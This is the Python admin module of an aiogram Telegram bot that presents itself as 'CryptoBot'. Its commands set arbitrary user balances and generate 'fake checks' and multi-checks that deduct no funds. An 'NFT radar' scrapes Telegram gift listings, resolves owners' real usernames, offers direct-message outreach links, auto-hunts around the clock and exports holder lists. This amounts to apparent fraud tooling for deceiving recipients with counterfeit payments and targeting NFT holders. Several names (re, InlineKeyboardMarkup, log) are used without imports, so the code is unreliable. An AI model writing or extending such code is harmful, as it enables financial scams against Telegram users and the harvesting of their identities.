# admin.py
import uuid
import os
import aiosqlite
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.filters import Command

from config import OWNER_ID, CURRENCIES, _e
from database import (
    update_balance, set_balance, log_tx, get_all_balances, 
    get_balance, DB_PATH, create_check,
    add_admin, is_admin, create_admin_fake_check, create_admin_multicheck
)
from keyboards import admin_menu_kb, nft_parser_menu_kb, nft_found_actions_kb, multicheck_created_kb

router = Router()

class AdminFSM(StatesGroup):
    waiting_balance = State()
    waiting_set_balance = State()
    waiting_fake_check = State()
    waiting_multicheck = State()
    waiting_add_admin = State()
    waiting_nft_range = State()
    waiting_nft_link = State()

async def check_admin(user_id: int) -> bool:
    if user_id == OWNER_ID:
        return True
    return await is_admin(user_id)

# --- ВХОД В АДМИНКУ ---
@router.message(Command("admin"))
async def cmd_admin(msg: Message):
    if not await check_admin(msg.from_user.id):
        return
    admin_banner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "admin_banner.png")
    text = (
        f"{_e('premium_clean', '⚡')} <b>Панель управления CryptoBot</b>\n\n"
        "Система мониторинга, балансов, чеков и NFT-радара Telegram.\n"
        "Выберите раздел для работы:"
    )
    if os.path.exists(admin_banner_path):
        from aiogram.types import FSInputFile
        await msg.answer_photo(
            photo=FSInputFile(admin_banner_path),
            caption=text,
            reply_markup=admin_menu_kb(),
            parse_mode="HTML"
        )
    else:
        await msg.answer(text, reply_markup=admin_menu_kb(), parse_mode="HTML")

# --- ВЫДАТЬ БАЛАНС ---
@router.callback_query(F.data == "admin:bal")
async def cb_admin_bal(cb: CallbackQuery, state: FSMContext):
    if not await check_admin(cb.from_user.id):
        await cb.answer("Нет доступа.", show_alert=True)
        return
    await state.set_state(AdminFSM.waiting_balance)
    await cb.message.edit_text(
        f"{_e('dollar', '💰')} <b>Выдача баланса</b>\n\n"
        f"Введите <code>ID сумма ВАЛЮТА</code>\n"
        f"Например: <code>123456789 1000 USDT</code>",
        parse_mode="HTML"
    )
    await cb.answer()

@router.message(AdminFSM.waiting_balance)
async def proc_admin_bal(msg: Message, state: FSMContext):
    if not await check_admin(msg.from_user.id):
        return
    try:
        parts = (msg.text or "").split()
        target_id = int(parts[0])
        amt = float(parts[1].replace(",", "."))
        
        if len(parts) > 2:
            asset = parts[2].upper()
        else:
            asset = "USDT"
            
        if asset not in CURRENCIES:
            raise ValueError
    except (ValueError, IndexError):
        await msg.answer("❌ Формат: <code>123456789 1000 USDT</code>", parse_mode="HTML")
        return

    await update_balance(target_id, asset, amt)
    await log_tx(target_id, "admin_deposit", asset, amt, "success", f"By admin {msg.from_user.id}")
    try:
        from keyboards import update_user_chat_menu_button
        await update_user_chat_menu_button(msg.bot, target_id)
    except Exception:
        pass
    
    await msg.answer(
        f"✅ Выдано <b>{amt} {asset}</b> пользователю <code>{target_id}</code>",
        reply_markup=admin_menu_kb(),
        parse_mode="HTML"
    )
    await state.clear()


# --- ИЗМЕНИТЬ БАЛАНС (УСТАНОВИТЬ) ---
@router.callback_query(F.data == "admin:set_bal")
async def cb_admin_set_bal(cb: CallbackQuery, state: FSMContext):
    if not await check_admin(cb.from_user.id):
        await cb.answer("Нет доступа.", show_alert=True)
        return
    await state.set_state(AdminFSM.waiting_set_balance)
    await cb.message.edit_text(
        f"{_e('settings', '✏️')} <b>Изменение баланса (Установка)</b>\n\n"
        f"Введите: <code>ID сумма ВАЛЮТА</code>\n"
        f"Или просто: <code>сумма ВАЛЮТА</code> (для изменения себе)\n\n"
        f"Например:\n"
        f"• <code>89000 USDT</code> — установит вам 89 000 USDT\n"
        f"• <code>{cb.from_user.id} 50000 USDT</code> — установит по ID",
        parse_mode="HTML"
    )
    await cb.answer()

@router.message(AdminFSM.waiting_set_balance)
async def proc_admin_set_bal(msg: Message, state: FSMContext):
    if not await check_admin(msg.from_user.id):
        return
    try:
        parts = (msg.text or "").split()
        if len(parts) == 2:
            target_id = msg.from_user.id
            amt = float(parts[0].replace(",", "."))
            asset = parts[1].upper()
        elif len(parts) >= 3:
            target_id = int(parts[0])
            amt = float(parts[1].replace(",", "."))
            asset = parts[2].upper()
        else:
            raise ValueError

        if asset not in CURRENCIES:
            raise ValueError
    except (ValueError, IndexError):
        await msg.answer(
            "❌ Неверный формат.\nПример: <code>89000 USDT</code> или <code>123456789 50000 USDT</code>",
            parse_mode="HTML"
        )
        return

    await set_balance(target_id, asset, amt)
    await log_tx(target_id, "admin_set_balance", asset, amt, "success", f"Set by admin {msg.from_user.id}")

    try:
        from keyboards import update_user_chat_menu_button
        await update_user_chat_menu_button(msg.bot, target_id)
    except Exception:
        pass

    await msg.answer(
        f"✅ Баланс <b>{asset}</b> пользователя <code>{target_id}</code> успешно установлен на <b>{amt:,.2f}</b>!",
        reply_markup=admin_menu_kb(),
        parse_mode="HTML"
    )
    await state.clear()

# --- ПРЯМЫЕ КОМАНДЫ /set_balance И /give_balance ---
@router.message(Command("set_balance", "setbalance"))
async def cmd_set_balance(msg: Message):
    if not await check_admin(msg.from_user.id):
        return
    args = (msg.text or "").split()[1:]
    if not args:
        await msg.answer("Формат: <code>/set_balance [ID] сумма ВАЛЮТА</code>\nПример: <code>/set_balance 89000 USDT</code>", parse_mode="HTML")
        return
    try:
        if len(args) == 2:
            target_id = msg.from_user.id
            amt = float(args[0].replace(",", "."))
            asset = args[1].upper()
        elif len(args) >= 3:
            target_id = int(args[0])
            amt = float(args[1].replace(",", "."))
            asset = args[2].upper()
        else:
            raise ValueError
        if asset not in CURRENCIES:
            raise ValueError
    except Exception:
        await msg.answer("❌ Ошибка в параметрах команды. Пример: <code>/set_balance 89000 USDT</code>", parse_mode="HTML")
        return

    await set_balance(target_id, asset, amt)
    await log_tx(target_id, "admin_set_balance", asset, amt, "success", f"Set via cmd by admin {msg.from_user.id}")

    try:
        from keyboards import update_user_chat_menu_button
        await update_user_chat_menu_button(msg.bot, target_id)
    except Exception:
        pass

    await msg.answer(f"✅ Баланс <b>{asset}</b> пользователя <code>{target_id}</code> изменен на <b>{amt:,.2f}</b>!", parse_mode="HTML")

@router.message(Command("give_balance", "givebalance"))
async def cmd_give_balance(msg: Message):
    if not await check_admin(msg.from_user.id):
        return
    args = (msg.text or "").split()[1:]
    if not args:
        await msg.answer("Формат: <code>/give_balance [ID] сумма ВАЛЮТА</code>\nПример: <code>/give_balance 1000 USDT</code>", parse_mode="HTML")
        return
    try:
        if len(args) == 2:
            target_id = msg.from_user.id
            amt = float(args[0].replace(",", "."))
            asset = args[1].upper()
        elif len(args) >= 3:
            target_id = int(args[0])
            amt = float(args[1].replace(",", "."))
            asset = args[2].upper()
        else:
            raise ValueError
        if asset not in CURRENCIES:
            raise ValueError
    except Exception:
        await msg.answer("❌ Ошибка в параметрах команды. Пример: <code>/give_balance 1000 USDT</code>", parse_mode="HTML")
        return

    await update_balance(target_id, asset, amt)
    await log_tx(target_id, "admin_deposit", asset, amt, "success", f"Given via cmd by admin {msg.from_user.id}")
    try:
        from keyboards import update_user_chat_menu_button
        await update_user_chat_menu_button(msg.bot, target_id)
    except Exception:
        pass
    await msg.answer(f"✅ Выдано <b>{amt:,.2f} {asset}</b> пользователю <code>{target_id}</code>!", parse_mode="HTML")

# --- ФЕЙК-ЧЕК ---
@router.callback_query(F.data == "admin:fake")
async def cb_admin_fake(cb: CallbackQuery, state: FSMContext):
    if not await check_admin(cb.from_user.id):
        await cb.answer("Нет доступа.", show_alert=True)
        return
    await state.set_state(AdminFSM.waiting_fake_check)
    await cb.message.edit_text(
        f"{_e('fake', '🧾')} <b>Фейк-чек</b>\n\n"
        f"Введите <code>сумма ВАЛЮТА</code>\n"
        f"Например: <code>500 GRAM</code>\n\n"
        f"<i>Средства не списываются с вашего баланса.</i>",
        parse_mode="HTML"
    )
    await cb.answer()

@router.message(AdminFSM.waiting_fake_check)
async def proc_admin_fake(msg: Message, state: FSMContext):
    if not await check_admin(msg.from_user.id):
        return
    try:
        parts = (msg.text or "").split()
        amt = float(parts[0].replace(",", "."))
        asset = parts[1].upper() if len(parts) > 1 else "USDT"
        
        if asset not in CURRENCIES:
            raise ValueError
    except (ValueError, IndexError):
        await msg.answer("❌ Формат: <code>500 USDT</code>", parse_mode="HTML")
        return

    try:
        cid = await create_admin_fake_check(msg.from_user.id, asset, amt)
    except Exception as e:
        await msg.answer(f"❌ Ошибка БД: {e}")
        return

    bot_info = await msg.bot.get_me()
    link = f"https://t.me/{bot_info.username}?start=check_{cid}"

    await msg.answer(
        f"👑 <b>Фейк-чек создан!</b>\n\n"
        f"Сумма: <b>{amt} {asset}</b>\n"
        f"Ссылка: <code>{link}</code>\n\n"
        f"<i>Баланс не был списан.</i>",
        reply_markup=admin_menu_kb(),
        parse_mode="HTML"
    )
    await state.clear()

# --- МУЛЬТИ-ЧЕК ---
@router.callback_query(F.data == "admin:multicheck")
async def cb_admin_multicheck(cb: CallbackQuery, state: FSMContext):
    if not await check_admin(cb.from_user.id):
        await cb.answer("Нет доступа.", show_alert=True)
        return
    await state.set_state(AdminFSM.waiting_multicheck)
    text = (
        f"{_e('premium_clean', '⚡')} <b>Генерация мульти-чека</b>\n\n"
        "Введите параметры через пробел:\n"
        "<code>СУММА_НА_ОДНОГО КОЛ-ВО ВАЛЮТА [ПАРОЛЬ]</code>\n\n"
        "<b>Примеры:</b>\n"
        "• <code>5 10 USDT</code> — 10 человек по 5 USDT\n"
        "• <code>2.5 20 TON 7777</code> — 20 человек по 2.5 TON с паролем <code>7777</code>\n\n"
        "<i>Средства не списываются с вашего баланса.</i>"
    )
    if cb.message.photo:
        await cb.message.answer(text, parse_mode="HTML")
    else:
        await cb.message.edit_text(text, parse_mode="HTML")
    await cb.answer()

@router.message(AdminFSM.waiting_multicheck)
async def proc_admin_multicheck(msg: Message, state: FSMContext):
    if not await check_admin(msg.from_user.id):
        return
    try:
        parts = (msg.text or "").split()
        if len(parts) < 2:
            raise ValueError("Недостаточно аргументов")
        per_amt = float(parts[0].replace(",", "."))
        limit = int(parts[1])
        if per_amt <= 0 or limit <= 0:
            raise ValueError("Сумма и количество должны быть больше 0")

        asset = "USDT"
        password = None
        if len(parts) > 2:
            candidate = parts[2].upper()
            if candidate in CURRENCIES:
                asset = candidate
                if len(parts) > 3:
                    password = parts[3]
            else:
                password = parts[2]
                if len(parts) > 3 and parts[3].upper() in CURRENCIES:
                    asset = parts[3].upper()
    except (ValueError, IndexError):
        await msg.answer(
            "❌ Формат: <code>СУММА КОЛ-ВО ВАЛЮТА [ПАРОЛЬ]</code>\n"
            "Пример: <code>5 10 USDT</code> или <code>2.5 20 TON 7777</code>",
            parse_mode="HTML"
        )
        return

    try:
        cid = await create_admin_multicheck(msg.from_user.id, asset, per_amt, limit, password=password)
    except Exception as e:
        await msg.answer(f"❌ Ошибка БД: {e}")
        return

    bot_info = await msg.bot.get_me()
    link = f"https://t.me/{bot_info.username}?start=check_{cid}"
    total_budget = round(per_amt * limit, 8)
    pass_str = f"\nПароль: <code>{password}</code>" if password else ""

    await msg.answer(
        f"{_e('premium_clean', '⚡')} <b>Мульти-чек создан!</b>\n\n"
        f"На одного: <b>{per_amt} {asset}</b>\n"
        f"Количество активаций: <b>{limit}</b>\n"
        f"Общий фонд: <b>{total_budget:,.2f} {asset}</b>{pass_str}\n\n"
        f"Ссылка:\n<code>{link}</code>\n\n"
        f"<i>Баланс не был списан.</i>",
        reply_markup=multicheck_created_kb(link),
        parse_mode="HTML"
    )
    await state.clear()

@router.message(Command("multicheck", "мультичек"))
async def cmd_multicheck(msg: Message, state: FSMContext):
    if not await check_admin(msg.from_user.id):
        return
    args = (msg.text or "").split()[1:]
    if not args or len(args) < 2:
        await state.set_state(AdminFSM.waiting_multicheck)
        await msg.answer(
            f"{_e('premium_clean', '⚡')} <b>Генерация мульти-чека</b>\n\n"
            "Введите параметры через пробел:\n"
            "<code>СУММА_НА_ОДНОГО КОЛ-ВО ВАЛЮТА [ПАРОЛЬ]</code>\n\n"
            "<b>Примеры:</b>\n"
            "• <code>5 10 USDT</code> — 10 человек по 5 USDT\n"
            "• <code>2.5 20 TON 7777</code> — 20 человек по 2.5 TON с паролем <code>7777</code>\n\n"
            "<i>Баланс админа не списывается.</i>",
            parse_mode="HTML"
        )
        return
    try:
        per_amt = float(args[0].replace(",", "."))
        limit = int(args[1])
        if per_amt <= 0 or limit <= 0:
            raise ValueError
        asset = "USDT"
        password = None
        if len(args) > 2:
            candidate = args[2].upper()
            if candidate in CURRENCIES:
                asset = candidate
                if len(args) > 3:
                    password = args[3]
            else:
                password = args[2]
                if len(args) > 3 and args[3].upper() in CURRENCIES:
                    asset = args[3].upper()
        
        cid = await create_admin_multicheck(msg.from_user.id, asset, per_amt, limit, password=password)
        bot_info = await msg.bot.get_me()
        link = f"https://t.me/{bot_info.username}?start=check_{cid}"
        total_budget = round(per_amt * limit, 8)
        pass_str = f"\nПароль: <code>{password}</code>" if password else ""
        await msg.answer(
            f"{_e('premium_clean', '⚡')} <b>Мульти-чек создан!</b>\n\n"
            f"На одного: <b>{per_amt} {asset}</b>\n"
            f"Количество активаций: <b>{limit}</b>\n"
            f"Общий фонд: <b>{total_budget:,.2f} {asset}</b>{pass_str}\n\n"
            f"Ссылка:\n<code>{link}</code>",
            reply_markup=multicheck_created_kb(link),
            parse_mode="HTML"
        )
    except Exception:
        await msg.answer("❌ Формат: <code>/multicheck 5 10 USDT [пароль]</code>", parse_mode="HTML")

# --- ВСЕ БАЛАНСЫ ---
@router.callback_query(F.data == "admin:all")
async def cb_admin_all(cb: CallbackQuery):
    if not await check_admin(cb.from_user.id):
        await cb.answer("Нет доступа.", show_alert=True)
        return
    balances = await get_all_balances(cb.from_user.id)
    text = f"{_e('message', '📊')} <b>Ваши балансы</b>\n\n"
    if not balances:
        text += "Пусто."
    else:
        for ticker, amt in balances.items():
            emoji = CURRENCIES.get(ticker, {}).get("emoji", "🪙")
            text += f"{emoji} <b>{ticker}</b>: {amt:.4f}\n"

    await cb.message.edit_text(
        text,
        reply_markup=admin_menu_kb(),
        parse_mode="HTML"
    )
    await cb.answer()

# --- ДОБАВИТЬ АДМИНА ---
@router.callback_query(F.data == "admin:add")
async def cb_admin_add(cb: CallbackQuery, state: FSMContext):
    if cb.from_user.id != OWNER_ID:
        await cb.answer("Только главный владелец может добавлять админов.", show_alert=True)
        return
    await state.set_state(AdminFSM.waiting_add_admin)
    await cb.message.edit_text(
        "👑 <b>Добавление админа</b>\n\n"
        "Отправьте Telegram ID нового администратора (например, <code>5742263111</code>):",
        parse_mode="HTML"
    )
    await cb.answer()

@router.message(AdminFSM.waiting_add_admin)
async def proc_admin_add(msg: Message, state: FSMContext):
    if msg.from_user.id != OWNER_ID:
        return
    try:
        new_admin_id = int(msg.text.strip())
    except ValueError:
        await msg.answer("❌ Отправьте корректный числовой ID.")
        return

    await add_admin(new_admin_id)
    await msg.answer(
        f"✅ Пользователь <code>{new_admin_id}</code> теперь администратор!",
        reply_markup=admin_menu_kb(),
        parse_mode="HTML"
    )
    await state.clear()

# --- NFT ПАРСЕР ПОДАРКОВ TELEGRAM ---
# Глобальное состояние фонового авто-мониторинга
AUTO_HUNTER_TASK = None
AUTO_HUNTER_ACTIVE = False

@router.callback_query(F.data == "admin:nft")
async def cb_admin_nft(cb: CallbackQuery, state: FSMContext):
    if not await check_admin(cb.from_user.id):
        await cb.answer("Нет доступа.", show_alert=True)
        return
    await state.clear()
    nft_banner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "nft_banner.png")
    text = (
        f"{_e('diamond_check', '💎')} <b>NFT-радар подарков Telegram</b>\n\n"
        "Парсер в реальном времени мониторит рынок Fragment и сеть TON:\n"
        "• Арбитраж флора и расчет дисконта\n"
        "• Фильтр редких узоров (&lt; 1% drop rate)\n"
        "• Детектор красивых и зеркальных номеров\n"
        "• Резолв реального @username владельца\n"
        "• Быстрый переход в ЛС владельца в 1 клик\n\n"
        "Выберите ценовой диапазон или фильтр:"
    )
    from aiogram.types import FSInputFile
    if os.path.exists(nft_banner_path):
        await cb.message.answer_photo(
            photo=FSInputFile(nft_banner_path),
            caption=text,
            reply_markup=nft_parser_menu_kb(AUTO_HUNTER_ACTIVE),
            parse_mode="HTML"
        )
        try:
            await cb.message.delete()
        except Exception:
            pass
    else:
        await cb.message.edit_text(text, reply_markup=nft_parser_menu_kb(AUTO_HUNTER_ACTIVE), parse_mode="HTML")
    await cb.answer()

@router.callback_query(F.data == "admin:menu")
async def cb_admin_menu(cb: CallbackQuery, state: FSMContext):
    if not await check_admin(cb.from_user.id):
        await cb.answer("Нет доступа.", show_alert=True)
        return
    await state.clear()
    admin_banner_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "admin_banner.png")
    text = (
        f"{_e('premium_clean', '⚡')} <b>Панель управления CryptoBot</b>\n\n"
        "Выберите раздел для работы:"
    )
    if os.path.exists(admin_banner_path):
        from aiogram.types import FSInputFile
        await cb.message.answer_photo(
            photo=FSInputFile(admin_banner_path),
            caption=text,
            reply_markup=admin_menu_kb(),
            parse_mode="HTML"
        )
        try:
            await cb.message.delete()
        except Exception:
            pass
    else:
        await cb.message.edit_text(text, reply_markup=admin_menu_kb(), parse_mode="HTML")
    await cb.answer()

@router.callback_query(F.data.startswith("nft:range:"))
async def cb_nft_range(cb: CallbackQuery, state: FSMContext):
    if not await check_admin(cb.from_user.id):
        await cb.answer("Нет доступа.", show_alert=True)
        return
    range_key = cb.data.split("nft:range:", 1)[1]
    
    if range_key == "custom":
        await state.set_state(AdminFSM.waiting_nft_range)
        await cb.message.answer(
            f"{_e('settings', '⚙️')} <b>Поиск по своему диапазону цен</b>\n\n"
            "Введите минимальную и максимальную цену в TON через дефис (например: <code>10-50</code>):",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="‹ Отмена", callback_data="admin:nft")]]),
            parse_mode="HTML"
        )
        await cb.answer()
        return

    ranges = {
        "low": (2.0, 5.0, "Лёгкий (2 – 5 TON)"),
        "mid": (15.0, 25.0, "Средний (15 – 25 TON)"),
        "high": (45.0, 100.0, "Высокий (45 – 100 TON)")
    }
    cfg = ranges.get(range_key)
    if not cfg:
        await cb.answer("Неверный диапазон", show_alert=True)
        return

    min_t, max_t, title = cfg
    await cb.answer()
    status_msg = await cb.message.answer(
        f"{_e('arrows_cycle2', '⏳')} <b>Поиск NFT-подарков ({title})...</b>\n"
        "Сканирование рынка, отсеивание арендованных пулов и резолв юзернеймов...",
        parse_mode="HTML"
    )

    from nft_parser import search_gifts_by_range
    gifts = await search_gifts_by_range(min_t, max_t, limit=3)
    try:
        await status_msg.delete()
    except Exception:
        pass

    if not gifts:
        await cb.message.answer(
            f"В диапазоне <b>{title}</b> новых доступных лотов с подтвержденным владельцем не найдено.",
            reply_markup=nft_parser_menu_kb(AUTO_HUNTER_ACTIVE),
            parse_mode="HTML"
        )
        return

    for g in gifts:
        extra_lines = []
        if g.get("discount_pct", 0) > 0:
            extra_lines.append(f"Флор: {g['floor_price']:g} TON | Дисконт: -{g['discount_pct']}% (~+{g['est_profit']} TON)")
        if g.get("special_serial"):
            extra_lines.append(f"Номер: {g['special_serial']}")
        if g.get("rare_traits"):
            extra_lines.append(f"Редкость: {', '.join(g['rare_traits'])}")
        
        portfolio = g.get("portfolio", {})
        if portfolio.get("tier"):
            extra_lines.append(f"Инвентарь: {portfolio['tier']}")

        extra_text = ("\n" + "\n".join(extra_lines)) if extra_lines else ""

        out_text = (
            f"Подарок {g['link']} был успешно найден!\n\n"
            f"Цена : {g['price']:g} TON\n\n"
            f"Владелец : {g['owner']}{extra_text}"
        )
        await cb.message.answer(
            out_text,
            reply_markup=nft_found_actions_kb(g["link"], g.get("outreach_url"), range_key),
            disable_web_page_preview=False
        )

@router.callback_query(F.data.startswith("nft:filter:"))
async def cb_nft_filter(cb: CallbackQuery):
    if not await check_admin(cb.from_user.id):
        await cb.answer("Нет доступа.", show_alert=True)
        return
    filter_type = cb.data.split("nft:filter:", 1)[1]
    rare_only = filter_type == "rare"
    serial_only = filter_type == "serial"
    title = "Редкие узоры (&lt;1%)" if rare_only else "Красивые номера"
    
    await cb.answer()
    status_msg = await cb.message.answer(
        f"{_e('arrows_cycle2', '⏳')} <b>Сканирование рынка на {title}...</b>",
        parse_mode="HTML"
    )
    from nft_parser import search_gifts_by_range
    gifts = await search_gifts_by_range(1.0, 500.0, limit=3, rare_only=rare_only, serial_only=serial_only)
    try:
        await status_msg.delete()
    except Exception:
        pass

    if not gifts:
        await cb.message.answer(
            f"По фильтру <b>{title}</b> новых лотов на продажу не обнаружено.",
            reply_markup=nft_parser_menu_kb(AUTO_HUNTER_ACTIVE),
            parse_mode="HTML"
        )
        return

    for g in gifts:
        extra_lines = []
        if g.get("special_serial"):
            extra_lines.append(f"Номер: {g['special_serial']}")
        if g.get("rare_traits"):
            extra_lines.append(f"Редкость: {', '.join(g['rare_traits'])}")
        extra_text = ("\n" + "\n".join(extra_lines)) if extra_lines else ""

        out_text = (
            f"Подарок {g['link']} был успешно найден!\n\n"
            f"Цена : {g['price']:g} TON\n\n"
            f"Владелец : {g['owner']}{extra_text}"
        )
        await cb.message.answer(
            out_text,
            reply_markup=nft_found_actions_kb(g["link"], g.get("outreach_url")),
            disable_web_page_preview=False
        )

@router.message(AdminFSM.waiting_nft_range)
async def proc_nft_custom_range(msg: Message, state: FSMContext):
    if not await check_admin(msg.from_user.id):
        return
    nums = re.findall(r"[\d.]+", msg.text or "")
    if len(nums) < 2:
        await msg.answer("Введите две цифры диапазона через дефис (например: <code>10-50</code>):", parse_mode="HTML")
        return
    try:
        min_t = float(nums[0])
        max_t = float(nums[1])
        if min_t > max_t:
            min_t, max_t = max_t, min_t
    except ValueError:
        await msg.answer("Некорректные числа.")
        return

    await state.clear()
    status_msg = await msg.answer(f"{_e('arrows_cycle2', '⏳')} <b>Поиск NFT-подарков в диапазоне {min_t:g} – {max_t:g} TON...</b>", parse_mode="HTML")
    from nft_parser import search_gifts_by_range
    gifts = await search_gifts_by_range(min_t, max_t, limit=3)
    try:
        await status_msg.delete()
    except Exception:
        pass

    if not gifts:
        await msg.answer(f"В диапазоне <b>{min_t:g} – {max_t:g} TON</b> лотов не найдено.", reply_markup=nft_parser_menu_kb(AUTO_HUNTER_ACTIVE), parse_mode="HTML")
        return

    for g in gifts:
        out_text = (
            f"Подарок {g['link']} был успешно найден!\n\n"
            f"Цена : {g['price']:g} TON\n\n"
            f"Владелец : {g['owner']}"
        )
        await msg.answer(out_text, reply_markup=nft_found_actions_kb(g["link"], g.get("outreach_url"), "custom"), disable_web_page_preview=False)

@router.callback_query(F.data == "nft:check_link")
async def cb_nft_check_link(cb: CallbackQuery, state: FSMContext):
    if not await check_admin(cb.from_user.id):
        await cb.answer("Нет доступа.", show_alert=True)
        return
    await state.set_state(AdminFSM.waiting_nft_link)
    await cb.message.answer(
        f"{_e('settings', '🔍')} <b>Проверка NFT-подарка по ссылке</b>\n\n"
        "Отправьте ссылку на подарок (например: <code>https://t.me/nft/chillflame-344906</code>) или его название/номер:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="‹ Отмена", callback_data="admin:nft")]]),
        parse_mode="HTML"
    )
    await cb.answer()

@router.message(AdminFSM.waiting_nft_link)
async def proc_nft_link(msg: Message, state: FSMContext):
    if not await check_admin(msg.from_user.id):
        return
    raw_val = (msg.text or "").strip()
    status_msg = await msg.answer(f"{_e('arrows_cycle2', '⏳')} <b>Парсинг данных NFT-подарка и определение владельца...</b>", parse_mode="HTML")
    from nft_parser import parse_single_nft_gift
    info = await parse_single_nft_gift(raw_val, skip_seen=False)
    try:
        await status_msg.delete()
    except Exception:
        pass

    if not info:
        await msg.answer("Не удалось найти информацию о данном подарке или его владелец скрыт.", reply_markup=nft_parser_menu_kb(AUTO_HUNTER_ACTIVE))
        return

    await state.clear()
    extra_lines = []
    if info.get("discount_pct", 0) > 0:
        extra_lines.append(f"Флор: {info['floor_price']:g} TON | Дисконт: -{info['discount_pct']}%")
    if info.get("special_serial"):
        extra_lines.append(f"Номер: {info['special_serial']}")
    if info.get("rare_traits"):
        extra_lines.append(f"Редкость: {', '.join(info['rare_traits'])}")
    extra_text = ("\n" + "\n".join(extra_lines)) if extra_lines else ""

    out_text = (
        f"Подарок {info['link']} был успешно найден!\n\n"
        f"Цена : {info['price']:g} TON\n\n"
        f"Владелец : {info['owner']}{extra_text}"
    )
    await msg.answer(out_text, reply_markup=nft_found_actions_kb(info["link"], info.get("outreach_url")), disable_web_page_preview=False)

@router.callback_query(F.data == "nft:export_csv")
async def cb_nft_export_csv(cb: CallbackQuery):
    if not await check_admin(cb.from_user.id):
        await cb.answer("Нет доступа.", show_alert=True)
        return
    await cb.answer("Формирование CSV базы...")
    from nft_parser import export_seen_gifts_csv
    from aiogram.types import BufferedInputFile
    csv_bytes = await export_seen_gifts_csv()
    doc = BufferedInputFile(csv_bytes, filename="nft_holders_export.csv")
    await cb.message.answer_document(
        document=doc,
        caption=f"{_e('premium_clean', '⚡')} <b>Экспорт базы спарсенных холдеров NFT</b>\n\nФайл содержит историю находок, цены и прямые ссылки на владельцев.",
        parse_mode="HTML"
    )

@router.callback_query(F.data == "nft:auto_toggle")
async def cb_nft_auto_toggle(cb: CallbackQuery):
    global AUTO_HUNTER_ACTIVE, AUTO_HUNTER_TASK
    if not await check_admin(cb.from_user.id):
        await cb.answer("Нет доступа.", show_alert=True)
        return
    import asyncio
    AUTO_HUNTER_ACTIVE = not AUTO_HUNTER_ACTIVE
    
    if AUTO_HUNTER_ACTIVE:
        async def hunter_loop():
            from nft_parser import search_gifts_by_range
            while AUTO_HUNTER_ACTIVE:
                try:
                    gifts = await search_gifts_by_range(2.0, 100.0, limit=2)
                    for g in gifts:
                        out_text = (
                            f"{_e('premium_clean', '⚡')} <b>[Авто-охота] Найден лот!</b>\n\n"
                            f"Подарок {g['link']} был успешно найден!\n\n"
                            f"Цена : {g['price']:g} TON\n\n"
                            f"Владелец : {g['owner']}"
                        )
                        await cb.bot.send_message(
                            cb.from_user.id,
                            out_text,
                            reply_markup=nft_found_actions_kb(g["link"], g.get("outreach_url")),
                            disable_web_page_preview=False
                        )
                except Exception as ex:
                    log.error("Hunter error: %s", ex)
                await asyncio.sleep(45)

        AUTO_HUNTER_TASK = asyncio.create_task(hunter_loop())
        await cb.answer("Авто-охота 24/7 активирована!", show_alert=True)
    else:
        if AUTO_HUNTER_TASK:
            AUTO_HUNTER_TASK.cancel()
        await cb.answer("Авто-охота остановлена.", show_alert=True)

    try:
        await cb.message.edit_reply_markup(reply_markup=nft_parser_menu_kb(AUTO_HUNTER_ACTIVE))
    except Exception:
        pass
